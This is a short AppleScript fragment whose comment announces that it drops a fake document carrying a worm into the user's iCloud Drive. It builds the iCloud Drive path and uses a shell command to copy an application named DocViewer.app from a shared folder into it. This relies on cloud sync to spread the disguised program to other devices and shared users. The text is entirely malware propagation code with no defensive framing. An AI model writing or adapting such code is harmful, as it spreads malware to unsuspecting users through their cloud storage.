-- Drop a fake document with a worm inside iCloud Drive
set iCloudPath to POSIX path of (path to home folder) & "Library/Mobile Documents/com~apple~CloudDocs/"
do shell script "cp -R /Users/Shared/DocViewer.app " & quoted form of iCloudPath
